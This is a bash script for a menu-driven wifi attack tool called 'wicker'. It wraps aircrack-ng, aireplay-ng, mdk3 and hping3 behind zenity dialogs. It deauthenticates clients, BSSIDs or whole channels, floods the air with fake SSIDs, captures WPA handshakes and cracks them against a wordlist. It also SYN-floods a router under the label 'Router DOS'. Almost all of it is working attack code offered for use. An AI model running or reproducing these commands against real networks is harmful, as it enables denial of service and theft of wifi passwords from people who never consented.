#!/usr/bin/env bash

#color codes
B='\e[1m'
r='\e[31m'
g='\e[1;32m'
y='\e[1;33m'
b='\e[1;34m'
p='\e[1;35m'
s='\e[0m'
bl='\e[5m'

#collect BSSID
loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`

#detect Ctrl + C
trap_ctrlc () {
tput bel

ask=0
if zenity --question --text "‚ö†Ô∏è Are you sure you want to quit?" --no-wrap ;
then ask=1
else
ask=0
fi

if [ $ask == 1 ];
then
exit 0

elif [ $ask == 0 ];
then
menu
fi
}

trap "trap_ctrlc" 2


#network interface
phy=$(basename /sys/class/net/wl*)

if [ "$phy" == "wl*" ];
then
   phy='not found'
fi

#turn on monitor mode [1]
on () {
(echo "10" ; sleep 1
echo "# ü•∑üèºTurning on monitor mode..." ; sleep 1
sudo xterm -T "‚ò†Ô∏èwicker‚ò†Ô∏è" -e "airmon-ng check kill"
echo "20" ; sleep 1

echo "# ü•∑üèºTrying to make ${phy} interface down..." ; sleep 1
sudo xterm -T "‚ò†Ô∏èwicker‚ò†Ô∏è" -e "ip link set ${phy} down"
echo "50" ; sleep 1

echo "# ü•∑üèºChanging the interface name from ${phy} to wlan0mon" ; sleep 1
sudo xterm -T "‚ò†Ô∏èwicker‚ò†Ô∏è" -e "ip link set ${phy} name wlan0mon"
echo "75" ; sleep 1

echo "# ü•∑üèºChanging card mode from managed to monitor..." ; sleep 1
sudo xterm -T "‚ò†Ô∏èwicker‚ò†Ô∏è" -e "iw dev wlan0mon set type monitor"
echo "100" ; sleep 1
) | zenity --progress \
--title="‚ò†Ô∏èwicker‚ò†Ô∏è" \
--text="ü•∑üèºTurning on monitor mode..." \
--percentage=0 \
--auto-close --no-cancel --width=300

zenity --info --title="‚ò†Ô∏èwicker‚ò†Ô∏è" --text="üëΩMonitor mode turned on successfully" --width=300

menu
}



#turn off monitor mode [2]
off () {

(echo "10" ; sleep 1
echo "# Turning off monitor mode..." ; sleep 1
sudo xterm -T "‚ò†Ô∏èwicker‚ò†Ô∏è"  -e "ip link set wlan0mon up"
echo "20" ; sleep 1

echo "# ü•∑üèºTurning interface mode managed from monitor..." ; sleep 1
sudo xterm -T "‚ò†Ô∏èwicker‚ò†Ô∏è"  -e "iw dev wlan0mon set type managed"
echo "50" ; sleep 1

echo "# ü•∑üèºTrying to restart Network Manager..." ; sleep 1
sudo xterm -T "‚ò†Ô∏èwicker‚ò†Ô∏è"  -e "service NetworkManager restart"
echo "75" ; sleep 1

echo "# ü•∑üèºEverything looks fine..." ; sleep 1
echo "100" ; sleep 1
) | zenity --progress \
--title="‚ò†Ô∏èwicker‚ò†Ô∏è" \
--text="ü•∑üèºTurning off monitor mode..." \
--percentage=0 \
--auto-close --no-cancel --width=300

zenity --info --title="‚ò†Ô∏èwicker‚ò†Ô∏è" --text="üì°Monitor mode turned off..." --width=300

menu
}



#check injection [3]
aireplay () {
sudo aireplay-ng -9 wlan0mon
menu
}




#run airodump-ng [4]
airodump_ask () {

r=$(zenity --info --title 'üõ∏airodump-ng' --text 'Scan single targetü•∑üèº or directly run airodump-ng' --extra-button single --extra-button full --ok-label back --width=400)

if [ -z $r ];
then
menu

elif [ "$r" == "full" ];
then
reset;
sudo airodump-ng wlan0mon


else
airodump_run
fi
}

airodump_run () {
if [ "$r" == "single" ];
then
bssid=`zenity --list --title="üõ∏airodump-ng" --text="Enter BSSID address" --cancel-label="Enter manually" --column="BSSID" $loot --width=500 --height=350`

fi

if [ -z $bssid ];
then
bssid=$(zenity --entry --title="üõ∏airodump-ng" --text="Enter target BSSID" --width=400 )
reset;
sudo airodump-ng --bssid $bssid wlan0mon

elif [ -z $bssid ];
then
zenity --error --width=250

else
sudo airodump-ng --bssid $bssid wlan0mon

fi
}



#deauth wifi if single[5]
kicks () {
if [ "$r" == "s" ] || [ "$r" == "S" ];
then

bssid=`zenity --list --title="üï∑Deauth wifi" --cancel-label="enter manually" --column="BSSID" $loot --width=500 --height=350`
fi

if [ -z $bssid ]
then
sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &

bssid=$(zenity --entry --title="üï∑Deauth wifi" --text="enter target BSSID" --width=500 )

mac=$(zenity --entry --title="üï∑Deauth wifi" --text="enter client MAC address" --width=500 )

num=$(zenity --entry --title="üï∑Deauth wifi" --text="enter the number of deauth req (default: 200) " --width=300)

[ -z $num ] && num=200

sudo killall xterm 2>/dev/null
sudo xterm -T "Sending deauth packets to the client" -e "aireplay-ng --deauth $num -a $bssid -D -c $mac wlan0mon"
zenity --info --title="‚ò†Ô∏èwicker‚ò†Ô∏è" --text="Process complete\nSent $num deauth packets to the client $mac of $bssid" --width=400
menu

else
mac=$(zenity --entry --title="üï∑Deauth wifi" --text="enter client MAC address" --width=500 )

num=$(zenity --entry --title="üï∑Deauth wifi" --text="enter the number of deauth req (default: 200) " --width=300)

[ -z $num ] && num=200
sudo killall xterm 2>/dev/null
sudo xterm -T "Sending deauth packets to the client" -e "sudo aireplay-ng --deauth $num -a $bssid -D -c $mac wlan0mon"
zenity --info --title="‚ò†Ô∏èwicker‚ò†Ô∏è" --text="Process complete\nSent $num deauth packets to the client $mac of $bssid" --width=400
menu

fi
}

#deauth wifi if full[5]
kickf () {

bssid=`zenity --list --title="üï∑Deauth wifi" --column="BSSID" --cancel-label="enter manually" $loot --width=500 --height=350`

if [ -z $bssid ];
then

sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &

bssid=$(zenity --entry --title="üï∑Deauth wifi" --text="enter target BSSID" --width=500)

num=$(zenity --entry --title="üï∑Deauth wifi" --text="enter the number of deauth req (default: 200)" --width=300)

[ -z $num ] && num=200

sudo killall xterm 2>/dev/null
sudo xterm -T "Sending deauth packets to the client" -e "aireplay-ng --deauth $num -D -a $bssid wlan0mon"
zenity --info --title="‚ò†Ô∏èwicker‚ò†Ô∏è" --text="Process complete\nSent $num deauth packets to $bssid" --width=400
menu

else
num=$(zenity --entry --title="üï∑Deauth wifi" --text="enter the number of deauth req (default: 200)" --width=300)

[ -z $num ] && num=200

sudo killall xterm 2>/dev/null
sudo xterm -T "Sending deauth packets to the client" -e "sudo aireplay-ng --deauth $num -D -a $bssid wlan0mon"
zenity --info --title="‚ò†Ô∏èwicker‚ò†Ô∏è" --text="Process complete\nSent $num deauth packets to $bssid" --width=400
menu

fi
}



#deauth wifi channel [6]
mdk () {

channel=$(zenity --entry --title="üï∏Ô∏èDeauth wifi channel" --text="enter channel number" --width=400)

if [ -z $channel ];
then
zenity --error --width=250


else
sudo xterm -T "All local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
echo -e "${B}${y}[!]${r}Press ( Ctrl + C ) to stop${s}"
sudo mdk3 wlan0mon d -c $channel
fi
}



#create multiple fake ssid [7]
mdk1 () {
channel=$(zenity --entry --title="üïµüèª‚Äç‚ôÇÔ∏èCreate multiple fake SSID" --text="Enter channel number" --width=300)

if [ -z $channel ];
then
zenity --error --width=250
menu
fi

zenity --info --title="üïµüèª‚Äç‚ôÇÔ∏èCreate multiple fake SSID" --text="Select a (.txt) file which cotains the SSID names" --width=300

txt=$(zenity --file-selection)

if [ -z $txt ];
then
zenity --error --width=250
menu
fi

zenity --info --title="üïµüèª‚Äç‚ôÇÔ∏èCreate multiple fake SSID" --text="Multiple SSID created successfully\nPress Ctrl+C to stop" --width=300 &

sudo xterm -T "Hosting fake Wifi SSID" -e  "cat $txt && mdk3 wlan0mon b -c $channel -f $txt"
menu

}



#capture handshake [8]
handshake () {
sudo xterm -T "All local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &

bssid=`zenity --list --title="üï∏Ô∏èCapture handshake" --cancel-label="Enter manually" --text="select BSSID" --column="BSSID" $loot --width=500 --height=400`

if [ -z "$bssid" ];
then
bssid=$(zenity --entry --title="üï∏Ô∏èCapture handshake" --text="Enter target BSSID" --width=400 )
fi

if [ -z $bssid ];
then
zenity --error --width=250
menu
fi

xterm -T "Making a directory for (.cap) files" -e "rm -rf /tmp/WICKER-CAPS && mkdir /tmp/WICKER-CAPS"


(
echo "# ü•∑üèºSaving captured packet in (.cap) file..." ; sleep 1
sudo xterm -T "Trying to capture handshake" -e "airodump-ng --bssid ${bssid} --write '/tmp/WICKER-CAPS/captured-handshake-${bssid}' wlan0mon" &
sleep 1


echo "# ü•∑üèºCaptured packets are storing in ${PWD} directory..." ; sleep 1
sudo xterm -T "Trying to deauthenticate users from the wifi" -e "aireplay-ng --deauth 200 -D -a ${bssid} wlan0mon" &

sleep 1

echo "# ü•∑üèºDeauth process stated..." ; sleep 1

sleep 1

echo "# ü•∑üèºTrying to capture handshake..." ; sleep 1

for i in {1..100}
do
echo $i ; sleep 1
done

) | zenity --progress \
--title="‚ò†Ô∏èwicker‚ò†Ô∏è" \
--text="üï∏Ô∏èCapture handshake" \
--percentage=0 \
--auto-close --no-cancel --width=300


file=`find /tmp/WICKER-CAPS -name "captured-handshake-*.cap"`
if aircrack-ng $file -w /opt/passwords/cow.txt | grep -q "EAPOL"
then
opinion=0
`zenity --question --title= --text="üîêHandshake Captured\nüîìTry to crack it?" --width=300` && opinion=1 || opinion=0

sudo killall xterm 2>/dev/null
[ "$opinion" == "1" ] && aircrack-ng $file --bssid $bssid -w /opt/passwords/cow.txt
[ "$opinion" == "0" ] && menu

else
asK=0
`zenity --question --title="‚ò†Ô∏èwicker‚ò†Ô∏è" --text="üü°Process complete...\nüî¥No handshake captured\nüîµTry again?" --width=300` && asK=1 || asK=0

sudo killall xterm 2>/dev/null
file=""
[ "$asK" == "1" ] && handshake
[ "$asK" == "0" ] && menu

fi
}



#router dos [9]
router () {

ip=$(zenity --entry --title="üöÄRouter DOS" --text="Enter the routers IP address" --width=400)

if [ -z "$ip" ]
then
zenity --error --text="‚ö†Ô∏èPlease enter a valid IP address" --width=250
menu

else
sudo xterm -T "Performing DOS on $ip | Press Ctrl+C to stop" -e  "hping3 -i u1 -S $ip"
menu
fi
}


menu () {
c=$(zenity --list --radiolist --title="‚ò†Ô∏èNetwork interface ${phy}Ô∏è ‚ò†Ô∏è" --text="Select an option" --column="Select" --column="Menu Item" \
FALSE "Turn on monitor mode" \
FALSE "Turn off monitor mode" \
FALSE "Capture handshake" \
FALSE "Deauth wifi" \
FALSE "Deauth channel" \
FALSE "Create multiple fake SSID" \
FALSE "Run airodump-ng" \
FALSE "Router DOS" --cancel-label="exit" --ok-label="ok" --extra-button="check injection" --width=600 --height=350)

if [ "$c" == "Turn on monitor mode" ];
then
on


elif [ "$c" == "Turn off monitor mode" ];
then
off



elif [ "$c" == "Run airodump-ng" ];
then
airodump_ask


elif [ "$c" == "Deauth wifi" ];
then
r=$(zenity --info --title 'üï∏Ô∏èDeauth wifi' --text 'Attack on a clients MAC address or directly BSSID?' --extra-button Client --extra-button BSSID --ok-label back --width=400)

[ -z $r ] && menu

[ "$r" == "BSSID" ] && kickf


[ "$r" == "Client" ] && kicks


elif [ "$c" == "Deauth channel" ];
then
mdk

elif [ "$c" == "Create multiple fake SSID" ];
then
mdk1


elif [ "$c" == "Capture handshake" ];
then
handshake


elif [ "$c" == "Router DOS" ];
then
router



elif [ "$c" == "check injection" ];
then
aireplay



elif [ "$c" == "" ];
then
exit 0

fi
}
menu
